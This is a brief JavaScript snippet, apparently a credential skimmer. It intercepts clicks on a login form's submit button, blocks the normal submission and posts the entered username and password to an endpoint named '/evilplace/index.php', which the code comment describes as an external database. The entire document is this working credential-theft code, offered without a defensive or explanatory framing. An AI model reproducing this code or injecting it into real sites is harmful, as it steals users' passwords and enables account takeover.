/**
* Post captured input values to external database just prior to form submit
*/

if (document.getElementById('submit-login')) {
  document.getElementById('submit-login').addEventListener('click', function (event) {
    event.preventDefault()
    $.post(
      '/evilplace/index.php',
      {
        username : document.getElementById('username').value,
        password : document.getElementById('password').value
      },
      function (resp) {
        console.log(resp)
      }
    )
  })
}
